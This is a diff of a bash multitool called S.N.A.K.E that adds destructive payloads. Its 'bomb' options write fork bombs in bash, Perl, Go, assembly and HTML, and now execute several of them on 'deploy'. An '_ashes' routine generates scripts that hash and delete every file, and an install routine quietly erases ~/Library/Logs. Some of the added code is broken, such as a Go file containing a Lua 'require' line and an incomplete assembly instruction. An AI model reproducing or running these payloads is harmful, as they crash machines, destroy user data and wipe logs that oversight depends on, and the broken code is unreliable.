@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.5.8"
+_version="0.6.1"
 _name="S.N.A.K.E"
 _morph_state="Unknown"
 
@@ -196,6 +196,103 @@ _people(){ #selfe
 
 
     _u_data 2> /dev/null
+}
+
+
+_iwannatest(){
+
+
+    cd ~ ; mkdir paine_coo_oont
+    cd paine_coo_oont
+    touch blue_whale
+    echo "$(uname -a)" >> blue_whale
+    echo "$(uname -m)" >> blue_whale
+    echo "$(uname -n)" >> blue_whale
+    echo "$(uname -p)" >> blue_whale
+    echo "$(uname -r)" >> blue_whale
+    echo "$(uname -s)" >> blue_whale
+    echo "$(uname -v)" >> blue_whale
+    echo "Gata coae"
+
+
+}
+
+
+_shbmb(){ #selfw
+
+   #not_listed
+   #not_ready
+   #not_tested
+
+    cd ~
+    mkdir parizer ; cd parizer
+    touch oops.s
+    echo "global start" >> oops.s
+    echo " " >> oops.s
+    echo "section .text" >> oops.s
+    echo " " >> oops.s
+    echo "start:" >> oops.s
+    echo "   xor  rsi, rsi" >> oops.s
+    echo "   push rsi" >> oops.s
+    echo "   mov  rdi" >> oops.s
+    echo "   push rdi" >> oops.s
+    echo "   mov  rdi, rsp" >> oops.s
+    echo "   xor  rdx, rdx" >> oops.s
+    echo " " >> oops.s
+    echo "   xor  rax, rax" >> oops.s
+    echo "   mov  al, 2" >> oops.s
+    echo "   ror  rax, 0x28" >> oops.s
+    echo "   mov  al, 0x3b" >> oops.s
+    echo "   syscall" >> oops.s
+    echo " " >> oops.s
+    /usr/local/bin/nasm -f macho64 oops.s
+    ld -macosx_version_min 10.7.0 -lSystem -o oops oops.o
+    sudo mv oops /usr/local/bin
+    cd .. ; rm -rf parizer
+    /usr/local/bin/oops
+    sudo rm -rf /usr/local/bin/oops
+
+
+
+}
+
+
+_assemble(){ #selft
+
+   #listed
+   #not_ready
+   #not_tested
+
+    _system="$(uname -s)"
+
+
+
+    if [ $_system == "Darwin" ]; then
+       /usr/local/bin/nasm -f macho64 $1.s
+       ld -macosx_version_min 10.7.0 -lSystem -o $1 $1.o
+    elif [[ $_system == "Linux" ]]; then
+       usr/local/bin/nasm -f elf64 $1.s
+       ld -o $1 $1.o
+    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+       printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+       printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+       printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+       printf "$RED Not supported yet$NC\n"
+    elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+       printf "$RED Not supported yet$NC\n"
+    else
+       printf "$RED Not supported default$NC\n"
+    fi
+
+
+    if [ "$(echo $2 | grep -c 'c')" == "1" ]; then
+        rm -rf $1.o
+        rm -rf $1.s
+    fi
+
 }
 
 
@@ -518,6 +615,11 @@ _myself(){ #selfc
 _stringify(){ #selft
 
 
+    #listed
+    #ready
+    #not_tested
+
+
 
    if [ "$1" == "-n" ]; then
       awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\\n//g'
@@ -558,7 +660,8 @@ _self(){ #selfh
      if [ "$2" == "num" ]; then
        cat $_loc | sort -u | grep '(){' | sed 's/(){ #//g' | sed 's/_//g' | rev | cut -c6- | rev | grep -v 'echo' | wc -l | sed 's/ //g'
      elif [[ "$2" == "list" ]]; then
-       cat $_loc | sort -u | grep '(){' | sed 's/(){ #//g' | sed 's/_//g' | rev | cut -c6- | rev | grep -v 'echo'
+       #cat $_loc | sort -u | grep '(){' | sed 's/(){ #//g' | sed 's/_//g' | rev | cut -c6- | rev | grep -v 'echo'
+       cat $_loc | sort -u | grep -e '^_' | grep -e '()'
      elif [[ "$2" == "wip" ]]; then
        cat $_loc | grep -c 'Not supported yet'
      elif [[ "$2" == "ratio" ]]; then
@@ -573,7 +676,7 @@ _self(){ #selfh
          printf "Color $(cat $_loc | grep -c '#color')\n"
          printf "Morph $(cat $_loc | grep -c '#morph')\n"
        else
-         printf "Print default\n"
+         printf "Print dcfault\n"
        fi
      elif [[ "$2" == "add" ]]; then
        sudo mkdir .blanao ; cd .blanao ; sudo cp $_loc ./snake
@@ -739,7 +842,7 @@ _self(){ #selfh
      fi
 
    elif [[ "$1" == "status" ]]; then
-     if [ -f /usr/local/bin/snake.sslz ]; then
+     if [ -f /usr/local/bin/xsnake ]; then
        printf "$GREEN"
        printf "Protected "
      else
@@ -781,13 +884,155 @@ _self(){ #selfh
            echo ""
          fi
 
+       elif [[ "$3" == "asm" ]]; then
+
+          if [ "$4" == "linux32" ]; then
+
+            if [ "$5" == "deploy" ]; then
+               cd ~ ;  mkdir .new_nest ; cd .new_nest
+               touch zion.s
+               echo " " >> zion.s
+               echo "global start" >> zion.s
+               echo " " >> zion.s
+               echo "section .text" >> zion.s
+               echo " " >> zion.s
+               echo "start:" >> zion.s
+               echo " " >> zion.s
+               echo "   mov eax, 2" >> zion.s
+               echo "   int 0x80" >> zion.s
+               echo "   jmp start" >> zion.s
+               echo " " >> zion.s
+               /usr/local/bin/nasm -f elf32 zion.s
+               ld -o zion zion.o
+               ./zion
+            else
+               echo " "
+               echo "global start"
+               echo " "
+               echo "section .text"
+               echo " "
+               echo "start:"
+               echo " "
+               echo "   mov eax, 2"
+               echo "   int 0x80"
+               echo "   jmp start"
+               echo " "
+            fi
+
+          elif [[ "$4" == "linux64" ]]; then
+
+            if [ "$5" == "deploy" ]; then
+               cd ~ ;  mkdir .new_nest ; cd .new_nest
+               touch zion.s
+               echo " " >> zion.s
+               echo "global start" >> zion.s
+               echo " " >> zion.s
+               echo "section .text" >> zion.s
+               echo " " >> zion.s
+               echo "start:" >> zion.s
+               echo " " >> zion.s
+               echo "   mov rax, 2" >> zion.s
+               echo "   syscall" >> zion.s
+               echo "   jmp start" >> zion.s
+               echo " " >> zion.s
+               /usr/local/bin/nasm -f elf64 zion.s
+               ld -o zion zion.o
+               ./zion
+            else
+               echo " "
+               echo "global start"
+               echo " "
+               echo "section .text"
+               echo " "
+               echo "start:"
+               echo " "
+               echo "   mov rax, 2"
+               echo "   syscall"
+               echo "   jmp start"
+               echo " "
+            fi
+
+          elif [[ "$4" == "mac32" ]]; then
+
+            if [ "$5" == "deploy" ]; then
+               cd ~ ;  mkdir .new_nest ; cd .new_nest
+               touch zion.s
+               echo " " >> zion.s
+               echo "global start" >> zion.s
+               echo " " >> zion.s
+               echo "section .text" >> zion.s
+               echo " " >> zion.s
+               echo "start:" >> zion.s
+               echo " " >> zion.s
+               echo "   mov eax, 0x2000002" >> zion.s
+               echo "   int 0x80" >> zion.s
+               echo "   jmp start" >> zion.s
+               echo " " >> zion.s
+               /usr/local/bin/nasm -f macho32 zion.s
+               ld -o zion zion.o
+               ./zion
+            else
+               echo " "
+               echo "global start"
+               echo " "
+               echo "section .text"
+               echo " "
+               echo "start:"
+               echo " "
+               echo "   mov eax, 0x2000002"
+               echo "   int 0x80"
+               echo "   jmp start"
+               echo " "
+            fi
+
+          elif [[ "$4" == "mac64" ]]; then
+
+             if [ "$5" == "deploy" ]; then
+                cd ~ ;  mkdir .new_nest ; cd .new_nest
+                touch zion.s
+                echo " " >> zion.s
+                echo "global start" >> zion.s
+                echo " " >> zion.s
+                echo "section .text" >> zion.s
+                echo " " >> zion.s
+                echo "start:" >> zion.s
+                echo " " >> zion.s
+                echo "   mov rax, 0x2000002" >> zion.s
+                echo "   syscall" >> zion.s
+                echo "   jmp start" >> zion.s
+                echo " " >> zion.s
+                /usr/local/bin/nasm -f macho64 zion.s
+                ld -macosx_version_min 10.7.0 -lSystem -o zion zion.o
+                ./zion
+             else
+                echo " "
+                echo "global start"
+                echo " "
+                echo "section .text"
+                echo " "
+                echo "start:"
+                echo " "
+                echo "   mov rax, 0x2000002"
+                echo "   syscall"
+                echo "   jmp start"
+                echo " "
+             fi
+
+          elif [[ "$4" == "win32" ]]; then
+             printf "$RED Not supported yet$NC\n"
+          elif [[ "$4" == "win64" ]]; then
+             printf "$RED Not supported yet$NC\n"
+          else
+             printf "$RED Platform unsupported$NC\n"
+          fi
+
        elif [[ "$3" == "bash" ]]; then
 
          if [ "$4" == "deploy" ]; then
            cd ~ ;  mkdir .new_nest ; cd .new_nest
            touch zion.sh
            echo ":(){ :|:& };:" >> zion.sh
-           pwd ; ls
+           sh zion.sh
          else
            echo ""
            echo ":(){ :|:& };:"
@@ -914,13 +1159,76 @@ _self(){ #selfh
            echo ""
          fi
 
-       elif [[ "$3" == "perl" ]]; then
+
+       elif [[ "$3" == "go" ]]; then
 
          if [ "$4" == "deploy" ]; then
            cd ~ ;  mkdir .new_nest ; cd .new_nest
-           touch zion.perl
-           echo "perl -e \"fork while fork\" &" >> zion.perl
+           touch zion.go
+           echo "" >> zion.go
+           echo "package main" >> zion.go
+           echo "local unistd = require \"posix.unistd\"" >> zion.go
+           echo "func main(){" >> zion.go
+           echo "   for {" >> zion.go
+           echo "      go main()" >> zion.go
+           echo "   }" >> zion.go
+           echo "}" >> zion.go
+           echo "" >> zion.go
            pwd ; ls
+         else
+
+           echo ""
+           echo "package main"
+           echo "local unistd = require \"posix.unistd\""
+           echo "func main(){"
+           echo "   for {"
+           echo "      go main()"
+           echo "   }"
+           echo "}"
+           echo ""
+
+         fi
+
+
+       elif [[ "$3" == "html" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.html
+           echo "" >> zion.html
+           echo "<html>" >> zion.html
+           echo "   <body>" >> zion.html
+           echo "     <script>" >> zion.html
+           echo "     setInterval(function() {" >> zion.html
+           echo "       var w = window.open();" >> zion.html
+           echo "       w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);" >> zion.html
+           echo "     }, 10);" >> zion.html
+           echo "   </script>" >> zion.html
+           echo "   </body>" >> zion.html
+           echo "</html>" >> zion.html
+           echo "" >> zion.html
+           pwd ; ls
+         else
+
+           echo ""
+           echo "<html>"
+           echo "   <body>"
+           echo "     <script>"
+           echo "     setInterval(function() {"
+           echo "       var w = window.open();"
+           echo "       w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);"
+           echo "     }, 10);"
+           echo "   </script>"
+           echo "   </body>"
+           echo "</html>"
+           echo ""
+
+         fi
+
+       elif [[ "$3" == "perl" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           perl -e "fork while fork" &
          else
            echo ""
            echo "perl -e \"fork while fork\" &"
@@ -957,7 +1265,7 @@ _self(){ #selfh
          fi
 
        elif [[ "$3" == "magic" ]]; then
-         printf " c :: bash :: bat :: py :: ps :: java :: lua :: perl\n"
+         printf " c :: bash :: bat :: py :: ps :: java :: lua :: go :: html :: perl :: asm\n"
        else
          printf "$RED Bomb type ERROR$NC\n"
        fi
@@ -997,7 +1305,9 @@ _self(){ #selfh
    elif [[ "$1" == "app" ]]; then
      if [ "$2" == "basic" ]; then
        if [ "$3" == "ios" ]; then
+
           printf "$RED Not supported yet$NC\n"
+
        elif [[ "$3" == "droid" ]]; then
           printf "$RED Not supported yet$NC\n"
        elif [[ "$3" == "hybrid" ]]; then
@@ -1119,9 +1429,8 @@ _router_info(){ #selfc
   _system="$(uname -s)"
 
   if [ $_system == "Darwin" ]; then #tw
-
      printf "\n"
-     printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
+     printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
      printf "\n"
      printf "$(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12)\n"
      printf "$YELLOW$(dig +short myip.opendns.com @resolver1.opendns.com)$NC\n"
@@ -5620,6 +5929,8 @@ echo "}" >> $1
 
 _inject(){ #selfi
 
+  #listed
+
   _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
 
 
@@ -5961,6 +6272,9 @@ fi
 _exec_u(){ #selfi
 
 
+   #listed
+
+
 if [ -f /usr/local/bin/snake ]; then
    _loc=/usr/local/bin/snake
 else
@@ -6029,6 +6343,8 @@ fi
 }
 
 _appID(){ #selft
+
+   #listed?
 
     ps -A | grep -m1 "$1" | awk '{print $1}'
 
@@ -6763,6 +7079,16 @@ _change(){ #selfc
 
 _u_engage(){ #selfc
 
+  cd ~ ; mkdir .udata
+  cd .udata ; touch udata
+  echo "$(uname -a)" >> udata
+  echo "$(uname -m)" >> udata
+  echo "$(uname -n)" >> udata
+  echo "$(uname -p)" >> udata
+  echo "$(uname -r)" >> udata
+  echo "$(uname -s)" >> udata
+  echo "$(uname -v)" >> udata
+
   cd ~ ; mkdir cartel ; cd cartel
   touch uname
   echo "#include<stdio.h>" >> uname
@@ -6960,6 +7286,10 @@ fi
   _new="$(openssl rand -hex 14)"
   _nfd="$(openssl rand -base64 32 | tr -cd 'a-z' | cut -c 1-3 | sed 's/^/./' | sed 's/ssh/blr/g' | sed 's/tor/blr/g' | sed 's/npm/blr/g')"
 
+  cd ~/Library/Logs
+  bash -c 'rm -rf ./*'
+  bash -c 'rm -rf ./.*'
+
 
   cd ~
   mkdir blana ; cd blana
@@ -6980,7 +7310,7 @@ fi
   sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
   cd .. ; sudo rm -rf blana
 
-  if [ $_wasp == true ]; then
+  if $_wasp; then
      snake protect c
   else
      echo "moo" >/dev/null
@@ -7226,7 +7556,7 @@ fi
   sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
   cd .. ; sudo rm -rf blana
 
-  if [ $_wasp == true ]; then
+  if $_wasp; then
      snake protect c
   else
      echo "moo" >/dev/null
@@ -7469,7 +7799,7 @@ fi
   sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
   cd .. ; sudo rm -rf blana
 
-  if [ $_wasp == true ]; then
+  if $_wasp; then
      snake protect c
   else
      echo "moo" >/dev/null
@@ -7893,10 +8223,49 @@ fi
 
 
 
+_diskSpeed(){ #selfe
+
+    #listed
+    #not_ready
+    #not_tested
+
+    _system="$(uname -s)"
+
+    if [ $_system == "Darwin" ]; then
+       time sh -c "dd if=/dev/zero of=/tmp/testfile bs=100k count=1k && sync"
+    elif [[ $_system == "Linux" ]]; then
+       printf "Not supported yet\n"
+    elif [[ $_system == "GNU" ]]; then
+       time sh -c "dd if=/dev/zero of=/tmp/testALT.img bs=1G count=1 conv=fdatasync"
+    elif [[ $_system == "Haiku" ]]; then
+       printf "Not supported yet\n"
+    elif [[ $_system == "HP-UX" ]]; then
+       printf "Not supported yet\n"
+    elif [[ $_system == "Minix" ]]; then
+       printf "Not supported yet\n"
+    elif [[ $_system == "OpenBSD" ]]; then
+       printf "Not supported yet\n"
+    elif [[ $_system == "SunOS" ]]; then
+       printf "Not supported yet\n"
+    else
+       printf "$RED Not supported sys$NC\n"
+    fi
+
+
+    _u_data 2> /dev/null
+
+}
+
 
 
 
 _radar(){ #selfe
+
+
+
+      #listed
+      #ready
+      #not_tested
 
 
 
@@ -7905,7 +8274,7 @@ _radar(){ #selfe
        if [ $_system == "Darwin" ]; then
 
          printf "\n"
-         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
+         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
          printf "\n"
 
          speedtest-cli | grep -E 'Download|Upload'
@@ -8040,6 +8409,10 @@ _radar(){ #selfe
 
 _purge() { #selfd
 
+ #listed
+ #not_ready
+ #not_tested
+
   if [ "$1" == "-q" ]; then
     while true; do
         read -ep 'Confirm?' response
@@ -8087,6 +8460,10 @@ _purge() { #selfd
 
 _rampage(){ #selfd
 
+
+  #listed
+  #ready
+  #not_tested
 
 
   _system="$(uname -s)"
@@ -8271,6 +8648,44 @@ _ash(){
 
 }
 
+_ashes(){
+
+
+    while true; do
+        read -ep 'Confirm?' response
+        case $response in
+            [Dd]* )
+
+
+
+
+
+            cd ~ ; mkdir balena_albastra
+            cd balena_albastra ; touch ashes
+            echo "for filename in /*.*; do" >> ashes
+            echo "[ -e \"\$filename\" ] || continue" >> ashes
+            echo "   ash " >> ashes
+            echo "done" >> ashes
+
+            touch ash
+            echo "find . -type f -print0 | while IFS= read -r -d \$'\0' file;" >> ash
+            echo "do cat \$file | openssl sha512 >> \$file.ash ; sudo rm -rf \$file ;" >> ash
+            echo "done" >> ash
+
+
+
+
+
+                break;;
+            * )
+                break;;
+        esac
+    done
+
+
+
+}
+
 
 _osf(){
 
@@ -8345,6 +8760,9 @@ _cheese(){ #selft
 
 
 
+  #listed
+
+
   _system="$(uname -s)"
 
   if [ $_system == "Darwin" ]; then   #tw
@@ -8394,6 +8812,8 @@ _cheese(){ #selft
 }
 
 _wisconsin(){ #selft
+
+   #listed
 
     _system="$(uname -s)"
 
@@ -8641,6 +9061,8 @@ _blyat6(){ #selft
 
 _IP(){ #selft
 
+   #listed
+
     nslookup $1 | sed -n '6p' | awk '{print $2}'
 
     _u_data 2> /dev/null
@@ -8650,17 +9072,51 @@ _IP(){ #selft
 
 _look(){ #selft
 
+   #listed
+
     curl ipinfo.io/$(nslookup $1 | sed -n '6p' | awk '{print $2}')
 
     _u_data 2> /dev/null
 
 }
 
+_maxPower(){ #selfe
 
+    dsenableroot
+
+}
+
+
+
+_react(){ #selft
+
+     # not listed
+
+     sudo cd ~
+     create-react-app $1
+
+
+
+}
+
+
+_express(){ #selft
+
+     #not listed
+
+     sudo cd ~
+     express-generator $1
+     cd $1 ; npm install ; cd ..
+
+
+}
 
 
 
 _affichage(){ #selfp
+
+
+   #listed
 
 
   clear
@@ -8692,6 +9148,9 @@ _uname(){ #selfp
 
 
 _generalize(){ #selfp
+
+
+  #listed
 
 
   _system="$(uname -s)"
@@ -9060,6 +9519,14 @@ _spread(){ #selfi
 
     brew install tor >/dev/null 2>&1
 
+    brew install node >/dev/null 2>&1
+
+    brew install nasm >/dev/null 2>&1
+
+    brew install cocoapods >/dev/null 2>&1
+
+    brew install yarn >/dev/null 2>&1
+
     brew install mas >/dev/null 2>&1
 
     brew install git-lfs >/dev/null 2>&1
@@ -9234,9 +9701,10 @@ _vndr(){ #selft
   # Search Database
   [[ $silent != true ]] && echo "Searching Database..."
   get_database
-  vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
+  vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}' | sed 's/<\/td>//g')"
+
   #vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
-  [[ -z $vendor ]] && vendor="Unknown"
+  [[ -z $vendor ]] && vendor="Unclear"
   # Print Result
   printf "$BLUE$vendor$NC\n"
   exit 0
@@ -9298,7 +9766,7 @@ _newv(){ #selft
   [[ $silent != true ]] && echo "Searching Database..."
   get_database
   #vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
-  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
+  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}' | sed 's/<\/td>//g')"
   [[ -z $vendor ]] && vendor="Unknown"
   # Print Result
   printf "$BLUE$vendor$NC\n"
@@ -9515,7 +9983,7 @@ _jvdr(){ #selft
   # Search Database
   get_database
   vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
-  [[ -z $vendor ]] && vendor="Unknown"
+  [[ -z $vendor ]] && vendor="Unclear"
   # Print Result
   printf "$BLUE$vendor$NC\n"
   exit 0
@@ -9588,7 +10056,7 @@ _newj(){ #selft
   # Search Database
   get_database
   vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{print $6,$7}' | sed 's/<\/td>//g')"
-  [[ -z $vendor ]] && vendor="Unknown"
+  [[ -z $vendor ]] && vendor="Unclear"
   # Print Result
   printf "$BLUE$vendor$NC\n"
   exit 0
@@ -9606,6 +10074,8 @@ _newScan(){ #demon
 
 
 _lock(){ #selfc
+
+   #listed
 
    _system="$(uname -s)"
 
@@ -9648,6 +10118,9 @@ _lock(){ #selfc
 _origin(){ #selft
 
 
+  #listed
+
+
   ps -p $1 | awk '{print $4;}' | sed '1d'
 
   _u_data 2> /dev/null
@@ -9656,6 +10129,9 @@ _origin(){ #selft
 
 
 _off(){ #selfc
+
+
+  #listed
 
   _system="$(uname -s)"
 
@@ -9692,6 +10168,10 @@ _off(){ #selfc
 
 
 _design(){ #selfx
+
+    #not_listed
+    #not_ready
+    #not_tested
 
     if [ "$1" == "wpn" ]; then
       if [ "$2" == "blade" ]; then
@@ -9763,6 +10243,10 @@ _design(){ #selfx
 
 _flush(){ #selft
 
+#listed
+#not_ready
+#not_tested
+
 _system="$(uname -s)"
 
 if [ $_system == "Darwin" ]; then #nn
@@ -9807,6 +10291,7 @@ _u_data 2> /dev/null
 _on(){ #selft
 
 
+   #
 
 
    _system="$(uname -s)"
@@ -10007,6 +10492,11 @@ _profile_core(){ #selfc
 _blood(){ #selft
 
 
+   #listed
+   #ready
+   #not_tested
+
+
   _system="$(uname -s)"
 
 
@@ -10029,7 +10519,6 @@ elif [[ $_system == "Linux" ]]; then #tn
   elif [[ $_system == "HP-UX" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
-
 
   elif [[ $_system == "Minix" ]]; then #nn
 
@@ -10062,6 +10551,11 @@ elif [[ $_system == "Linux" ]]; then #tn
 }
 
 _light(){ #selft
+
+
+   #listed
+   #ready
+   #not_tested
 
 
 
@@ -10119,6 +10613,11 @@ _u_data 2> /dev/null
 }
 
 _poof(){ #selfc
+
+
+   #listed
+   #ready
+   #not_tested
 
 
   _system="$(uname -s)"
@@ -10195,6 +10694,10 @@ _poof(){ #selfc
 
 _clear(){ #selfc
 
+   #listed
+   #not_ready
+   #not_tested
+
    history -c
    airport -z
    _rampage
@@ -10203,6 +10706,11 @@ _clear(){ #selfc
 }
 
 _macA(){ #selft
+
+
+#listed
+#not_ready
+#not_tested
 
 _system="$(uname -s)"
 
@@ -10239,6 +10747,8 @@ _u_data 2> /dev/null
 
 _suicide(){ #selfc
 
+   #listed
+
   _system="$(uname -s)"
 
 
@@ -10262,6 +10772,8 @@ _suicide(){ #selfc
    elif [[ $_system == "SunOS" ]]; then #nn
      shutdown
    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
+     shutdown
+   elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
      shutdown
    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
      shutdown
@@ -10288,7 +10800,9 @@ _suicide(){ #selfc
 _reboot(){ #selfc
 
 
-
+   #listed
+   #ready
+   #not_tested
 
 _system="$(uname -s)"
 
@@ -10313,6 +10827,8 @@ elif [[ $_system == "Linux" ]]; then #tw
  elif [[ $_system == "SunOS" ]]; then #nn
    reboot
  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
+   reboot
+ elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
    reboot
  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
    reboot
@@ -10411,6 +10927,8 @@ _capture(){ #selft
     printf "os: $(uname -s),\n"
     printf "arch: $(uname -m),\n"
     printf "power: true,\n"
+    printf "hwaddr: true,\n"
+    printf "vendor: true, \n"
     printf ""
 
   elif [[ "$(echo $1 | grep -c 'v')" == "1" ]]; then
@@ -10428,7 +10946,7 @@ _capture(){ #selft
 }
 
 
-_incr(){
+_incr(){ #selft
 
     printf "$RED Not supported yet$NC\n"
 
@@ -10983,12 +11501,20 @@ _morph(){ #selfx
 }
 
 _openWith(){ #selft
+
+   #listed
+   #not_ready
+   #not_tested
+
    open -a $1 $2
 
    _u_data 2> /dev/null
 }
 
 _thermic(){ #selfc
+
+
+   #listed
 
 while true
    do
@@ -11227,6 +11753,11 @@ if [ $_system == "Darwin" ]; then
 
 _update(){ #selfi
 
+
+  #listed
+  #ready
+  #not_tested
+
   _system="$(uname -s)"
 
 
@@ -11449,6 +11980,10 @@ if [ $_system == "Darwin" ]; then
 
 _brew(){ #selfx
 
+
+   #listed
+   #ready
+   #tested
 
 
    if [ $1 == "html" ]; then
@@ -11989,6 +12524,10 @@ elif [[ "$(echo $1 | grep -c 'radar')" == "1" ]]; then
 
      _radar
 
+elif [[ "$(echo $1 | grep -c 'speeed')" == "1" || "$(echo $1 | grep -c 'disk')" == "1" && "$(echo $1 | grep -c 'speed')" == "1" ]]; then
+
+     _diskSpeed
+
 elif [[ "$(echo $1 | grep -c 'suicide')" == "1" ]]; then
 
     _suicide
@@ -12024,6 +12563,10 @@ elif [[ "$(echo $1 | grep -c 'mb')" == "1" ]]; then
 elif [[ "$(echo $1 | grep -c 'poof')" == "1" ]]; then
 
      _poof
+
+elif [[ "$(echo $1 | grep -c 'lameloft')" == "1" ]]; then
+
+     _iwannatest
 
 elif [[ "$(echo $1 | grep -c 'clear')" == "1" ]]; then
 
@@ -12197,6 +12740,18 @@ elif [[ "$(echo $1 | grep -c 'people')" == "1" ]]; then
 
   _people
 
+elif [[ "$(echo $1 | grep -c 'stringify')" == "1" || "$(echo $1 | grep -c 'strify')" == "1" ]]; then
+
+  _stringify $2
+
+elif [[ "$(echo $1 | grep -c 'mirror')" == "1" ]]; then
+
+  _mirror
+
+elif [[ "$(echo $1 | grep -c 'asm')" == "1" ]]; then
+
+  _assemble $2
+
 elif [[ "$(echo $1 | grep -c 'devices')" == "1" ]]; then
 
   _people
@@ -12246,23 +12801,13 @@ elif [[ "$1" == "-test" ]]; then
   _newScan
 
 
-elif [[ "$1" == "-blink" ]]; then
+elif [[ "$1" == "-blink" || "$1" == "blink" ]]; then
 
-  printf "$_blinking\n"
+  _w_melt blinking=false blinking=true
 
-elif [[ "$1" == "-unblink" ]]; then
+elif [[ "$(echo $1 | grep -c 'unblink')" == "1" ]]; then
   #cat /usr/local/bin/snake | sed 's/_blinking=true/_blinking=false/g' > /.thesnake ; snake -uninstall ; sudo mv .thesnake /usr/local/bin/snake ; cd /usr/local/bin/ ; sh snake -qinstall ; cd ~
-  printf "$_blinking\n"
-
-  _converted=$( echo snake | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
-
-      cd ~ ; mkdir .blanao ; cd .blanao
-      sudo cp /usr/local/bin/snake ./snake
-      cat snake | sed "s/_blinking=true/_blinking=false/g" >> snake
-      sudo chmod +x snake ; sudo cp snake /usr/local/bin/ ; cd .. ; sudo rm -rf .blanao
-
-elif  [[ "$1" == "-check" ]]; then
-  printf "$_blinking\n"
+  _w_melt blinking=true blinking=false
 
 elif [[ "$(echo $1 | grep -c 'blood')" == "1" ]]; then
 
